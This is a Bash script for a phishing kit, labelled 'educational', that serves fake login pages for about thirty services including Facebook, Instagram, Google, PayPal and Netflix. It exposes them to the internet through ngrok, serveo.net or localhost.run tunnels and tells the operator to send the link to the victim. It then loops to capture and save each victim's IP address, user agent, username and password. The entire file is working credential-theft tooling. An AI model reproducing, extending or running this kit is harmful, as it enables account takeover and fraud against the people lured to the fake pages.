trap 'printf "\n";stop;exit 1' 2
deps() {
command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
}
banner() {
clear
printf "                               \e[31;1m  __  __       _       _                         \e[0m\n"
printf "                               \e[31;1m |  \/  |     | |     (_)                        \e[0m\n"
printf "                               \e[35;1m | \  / | __ _| |_   ___ _   _ ___               \e[0m\n"
printf "                               \e[31;1m | |\/| |/ _  | \ \ / / | | | / __|              \e[0m\n"
printf "                               \e[35;1m | |  | | (_| | |\ V /| | |_| \__ \              \e[0m\n"
printf "                               \e[31;1m |_|  |_|\__,_|_| \_/ |_|\__,_|___/              \e[0m\n"
printf "                               \e[35;1m                                                 \e[0m\n"
printf "                                      \e[33;1m\e[1;97m    Version 1.1.0      \e[0m\n"
printf " \n"
printf "                           \e[35;1m Herramienta creada por Malvius (educativo)\e[0m\n"
printf " \n"
printf "                             \e[30;1mXD *Eliga un ataque para su victima* DX\e[0m\n"
printf " \n"
}
menu() {
printf "                     \e[0m\e[1;77m01\e[0m\e[0m\e[1;30m Facebook  \e[0m\e[0m\e[1;77m11\e[0m\e[0m\e[1;30m Twitch      \e[0m\e[0m\e[1;77m21\e[0m\e[0m\e[1;30m Facebook packs evelyn\e[0m\n"
printf "                     \e[0m\e[1;77m02\e[0m\e[0m\e[1;30m Instagram \e[0m\e[0m\e[1;77m12\e[0m\e[0m\e[1;30m Pinterest   \e[0m\e[0m\e[1;77m22\e[0m\e[0m\e[1;30m Facebook emoji\e[0m\n"
printf "                     \e[0m\e[1;77m03\e[0m\e[0m\e[1;30m Google    \e[0m\e[0m\e[1;77m13\e[0m\e[0m\e[1;30m Snapchat    \e[0m\e[0m\e[1;77m23\e[0m\e[0m\e[1;30m Facebook Free Fire\e[0m\n"
printf "                     \e[0m\e[1;77m04\e[0m\e[0m\e[1;30m Microsoft \e[0m\e[0m\e[1;77m14\e[0m\e[0m\e[1;30m Linkedin    \e[0m\e[0m\e[1;77m24\e[0m\e[0m\e[1;30m Facebook Perfil\e[0m\n"
printf "                     \e[0m\e[1;77m05\e[0m\e[0m\e[1;30m Netflix   \e[0m\e[0m\e[1;77m15\e[0m\e[0m\e[1;30m Ebay        \e[0m\e[0m\e[1;77m25\e[0m\e[0m\e[1;30m Facebook Oficina online\e[0m\n"
printf "                     \e[0m\e[1;77m06\e[0m\e[0m\e[1;30m Paypal    \e[0m\e[0m\e[1;77m16\e[0m\e[0m\e[1;30m Dropbox     \e[0m\e[0m\e[1;77m26\e[0m\e[0m\e[1;30m Facebook Paechis-hack\e[0m\n"
printf "                     \e[0m\e[1;77m07\e[0m\e[0m\e[1;30m Steam     \e[0m\e[0m\e[1;77m17\e[0m\e[0m\e[1;30m Protonmail  \e[0m\e[0m\e[1;77m27\e[0m\e[0m\e[1;30m Yandex\e[0m\n"
printf "                     \e[0m\e[1;77m08\e[0m\e[0m\e[1;30m Twitter   \e[0m\e[0m\e[1;77m18\e[0m\e[0m\e[1;30m Spotify     \e[0m\e[0m\e[1;77m28\e[0m\e[0m\e[1;30m StackoverFlow\e[0m\n"
printf "                     \e[0m\e[1;77m09\e[0m\e[0m\e[1;30m PS2       \e[0m\e[0m\e[1;77m19\e[0m\e[0m\e[1;30m Reddit      \e[0m\e[0m\e[1;77m29\e[0m\e[0m\e[1;30m Vk\e[0m\n"
printf "                     \e[0m\e[1;77m10\e[0m\e[0m\e[1;30m Github    \e[0m\e[0m\e[1;77m20\e[0m\e[0m\e[1;30m Adobe       \e[0m\e[0m\e[1;77mx\e[0m \e[0m\e[1;30mExit\e[0m\n"
printf "\e[0m\n"
read -p $'                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
facebook
elif [[ $option == 2 || $option == 02 ]]; then
instagram
elif [[ $option == 3 || $option == 03 ]]; then
gmail
elif [[ $option == 4 || $option == 04 ]]; then
server="microsoft"
start
elif [[ $option == 5 || $option == 05 ]]; then
server="netflix"
start
elif [[ $option == 6 || $option == 06 ]]; then
server="paypal"
start
elif [[ $option == 7 || $option == 07 ]]; then
server="steam"
start
elif [[ $option == 8 || $option == 08 ]]; then
server="twitter"
start
elif [[ $option == 9 || $option == 09 ]]; then
server="playstation"
start
elif [[ $option == 10 ]]; then
server="github"
start
elif [[ $option == 11 ]]; then
server="twitch"
start
elif [[ $option == 12 ]]; then
server="pinterest"
start
elif [[ $option == 13 ]]; then
server="snapchat"
start
elif [[ $option == 14 ]]; then
server="linkedin"
start
elif [[ $option == 15 ]]; then
server="ebay"
start
elif [[ $option == 16 ]]; then
server="dropbox"
start
elif [[ $option == 17 ]]; then
server="protonmail"
start
elif [[ $option == 18 ]]; then
server="spotify"
start
elif [[ $option == 19 ]]; then
server="reddit"
start
elif [[ $option == 20 ]]; then
server="adobe"
start
elif [[ $option == 21 ]]; then
server="deviantart"
start
elif [[ $option == 22 ]]; then
server="badoo"
start
elif [[ $option == 23 ]]; then
server="origin"
start
elif [[ $option == 24 ]]; then
server="cryptocoinsniper"
start
elif [[ $option == 25 ]]; then
server="yahoo"
start
elif [[ $option == 26 ]]; then
server="wordpress"
start
elif [[ $option == 27 ]]; then
server="yandex"
start
elif [[ $option == 28 ]]; then
server="stackoverflow"
start
elif [[ $option == 29 ]]; then
vk
elif [[ $option == X || $option == x ]]; then
exit 1
else
printf "                     \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;35m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
facebook(){
printf " \n"
printf "                     \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;30m Traditional Login Page\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;30m Advanced Voting Poll Login Page\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;30m Fake Security Login Page\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;30m Facebook Messenger Login Page\e[0m\n"
printf "\e[0m\n"
read -p $'                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="facebook"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="fb_advanced"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="fb_security"
start
elif [[ $option == 4 || $option == 04 ]]; then
server="fb_messenger"
start
else
printf "                     \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;35m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
instagram(){
printf " \n"
printf "                     \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;30m Traditional Login Page\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;30m Auto Followers Login Page\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;30m Blue Badge Verify Login Page\e[0m\n"
printf "\e[0m\n"
read -p $'                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="ig_followers"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="ig_verify"
start
else
printf "                     \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;35m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
gmail(){
printf " \n"
printf "                     \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;30m Gmail Old Login Page\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;30m Gmail New Login Page\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;30m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
read -p $'                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="google"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="google_new"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="google_poll"
start
else
printf "                     \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;35m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
vk(){
printf " \n"
printf "                     \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;30m Traditional Login Page\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;30m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
read -p $'                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="vk"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="vk_poll"
start
else
printf "                     \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;35m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e linksender ]]; then
rm -rf linksender
fi
}
start() {
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf "\n"
printf "                     \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;30m LocalHost\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;30m Ngrok.io\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;30m Serveo.net\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;30m Localhost.run\e[0m\n"
d_o_server="2"
printf "\n"
read -p $'                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Select a Port Forwarding option: \e[0m\e[1;96m\en' option_server
option_server="${option_server:-${d_o_server}}"
if [[ $option_server == 3 || $option_server == 03 ]]; then
start_s
elif [[ $option_server == 2 || $option_server == 02 ]]; then
start_n
elif [[ $option_server == 4 || $option_server == 04 ]]; then
start_local
elif [[ $option_server == 1 || $option_server == 01 ]]; then
start_l
else
printf "                     \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;35m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
start
fi
}
start_s() {
if [[ -e sitios-web/$server/ip.txt ]]; then
rm -rf sitios-web/$server/ip.txt
fi
if [[ -e sitios-web/$server/usernames.txt ]]; then
rm -rf sitios-web/$server/usernames.txt
fi
def_port="5555"
printf "\e[0m\n"
printf '                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Select a Port (Default:\e[0m\e[1;31m %s \e[0m\e[1;30m): \e[0m\e[1;35m' $def_port
read port
port="${port:-${def_port}}"
start_serveo
}
start_serveo() {
printf "\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Initializing...\e[0m\e[1;92m(\e[0m\e[1;35mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd sitios-web/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Launching Serveo ..\e[0m\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > linksender ' &
printf "\n"
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
printf "\n"
printf '                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Send the link to victim :\e[0m\e[1;35m %s \n' $send_url
printf "\n"
found
}
start_n() {
if [[ -e sitios-web/$server/ip.txt ]]; then
rm -rf sitios-web/$server/ip.txt
fi
if [[ -e sitios-web/$server/usernames.txt ]]; then
rm -rf sitios-web/$server/usernames.txt
fi
if [[ -e ngrok ]]; then
echo ""
else
printf "\e[0m\n"
printf "                      \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Initializing...\e[0m\e[1;92m(\e[0m\e[1;35mlocalhost:5555\e[0m\e[1;92m)\e[0m\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
else
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
fi
fi
printf "\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Launching Ngrok ..\e[0m\n"
cd sitios-web/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
ngrok http 5555 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "http://[0-9a-z]*\.ngrok.io")
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Send the link to victim :\e[0m\e[1;35m %s \n" $link
found
}
start_local(){
def_port="5555"
printf "\e[0m\n"
printf '                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Select a Port (Default:\e[0m\e[1;31m %s \e[0m\e[1;30m): \e[0m\e[1;35m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Initializing...\e[0m\e[1;92m(\e[0m\e[1;35mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd sitios-web/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Launching LocalHostRun ..\e[0m\n"
printf "\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[0m\n"
printf "\e[1;30m\n"
ssh        -R 80:localhost:$port ssh.localhost.run 2>&1
printf "\e[0m\n"
printf "\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Login Info..\e[0m\n"
while [ true ]; do
if [[ -e "sitios-web/$server/ip.txt" ]]; then
c_ip
rm -rf sitios-web/$server/ip.txt
fi
sleep 0.75
if [[ -e "sitios-web/$server/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' sitios-web/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sitios-web/$server/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Account:\e[0m\e[1;31m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Password:\e[0m\e[1;31m %s\n\e[0m" $password
cat sitios-web/$server/usernames.txt >> sitios-web/$server/usuarios.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Saved:\e[0m\e[1;31m sitios-web/%s/usuarios.txt\e[0m\n" $server
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Press Ctrl + C to exit.\e[0m\n"
rm -rf sitios-web/$server/usernames.txt
fi
sleep 0.75
done
}
start_l() {
def_port="5555"
printf "\e[0m\n"
printf '                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Select a Port (Default:\e[0m\e[1;31m %s \e[0m\e[1;30m): \e[0m\e[1;35m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Initializing...\e[0m\e[1;92m(\e[0m\e[1;35mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd sitios-web/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Successfully Hosted at :\e[0m\e[1;35m http://localhost:$port\e[0m\n"
printf "\n"
found
}
found() {
printf "\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Waiting for Login Info,\e[0m\e[1;30m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do
if [[ -e "sitios-web/$server/ip.txt" ]]; then
printf "\n"
printf "                     \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;30m Victim IP Found!\n"
printf "\n"
c_ip
rm -rf sitios-web/$server/ip.txt
fi
sleep 0.75
if [[ -e "sitios-web/$server/usernames.txt" ]]; then
printf "                     \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;35m Login info Found !!\n"
printf "\n"
c_cred
rm -rf sitios-web/$server/usernames.txt
fi
sleep 0.75
done
}
c_ip() {
touch sitios-web/$server/usuarios.txt
ip=$(grep -a 'IP:' sitios-web/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sitios-web/$server/ip.txt | cut -d '"' -f2)
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Victim IP:\e[0m\e[1;31m %s\e[0m\n" $ip
printf "\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Saved:\e[0m\e[1;31m sitios-web/%s/ip-victima.txt\e[0m\n" $server
printf "\n"
cat sitios-web/$server/ip.txt >> sitios-web/$server/ip-victima.txt
}
c_cred() {
account=$(grep -o 'Username:.*' sitios-web/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sitios-web/$server/usernames.txt | cut -d ":" -f2)
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Account:\e[0m\e[1;31m %s\n\e[0m" $account
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;30m Password:\e[0m\e[1;31m %s\n\e[0m" $password
cat sitios-web/$server/usernames.txt >> sitios-web/$server/usuarios.txt
printf "\e[0m\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Saved:\e[0m\e[1;31m sitios-web/%s/usuarios.txt\e[0m\n" $server
printf "\n"
printf "                     \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;35m Waiting for Next Login Info,\e[0m\e[1;30m Ctrl + C to exit.\e[0m\n"
}
banner
deps
menu
